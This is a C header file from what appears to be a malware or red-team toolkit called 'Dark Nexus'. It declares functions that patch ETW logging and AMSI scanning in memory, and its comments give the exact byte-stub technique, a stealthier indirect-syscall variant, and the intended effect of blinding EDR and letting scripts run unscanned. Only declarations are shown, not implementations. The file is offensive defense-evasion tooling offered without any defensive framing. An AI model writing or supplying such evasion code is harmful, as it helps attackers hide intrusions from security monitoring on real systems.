#ifndef DN_ETW_PATCH_H
#define DN_ETW_PATCH_H

#include <windows.h>

/*
 * Dark Nexus - ETW & AMSI Patching
 *
 * Patches ETW event logging and AMSI scanning functions
 * to blind EDR telemetry and disable script inspection.
 *
 * ETW patch: overwrites EtwEventWrite prologue with a
 * 'xor eax, eax; ret' stub (return STATUS_SUCCESS, do nothing).
 * This silences all user-mode ETW providers in the process,
 * including .NET CLR, PowerShell, and Threat Intelligence consumers.
 *
 * AMSI patch: overwrites AmsiScanBuffer prologue with
 * 'mov eax, 0x80070057; ret' (return E_INVALIDARG).
 * AMSI consumers interpret this as "scan failed, allow execution."
 *
 * Both patches use VirtualProtect only on the specific bytes
 * being modified (not the entire function), and restore
 * original protection after patching.
 */

// Patch EtwEventWrite in ntdll.dll
// Silences all user-mode ETW providers in the calling process
BOOL dn_patch_etw(void);

// Patch AmsiScanBuffer in amsi.dll
// Causes all AMSI scans to return AMSI_RESULT_CLEAN
BOOL dn_patch_amsi(void);

// Patch EtwEventWrite using indirect syscalls for VirtualProtect
// Stealthier variant that doesn't touch the hooked VirtualProtect
BOOL dn_patch_etw_syscall(void);

// Combined: patch everything in the right order
// Returns number of successful patches (0-2)
int dn_patch_all(void);

#endif // DN_ETW_PATCH_H
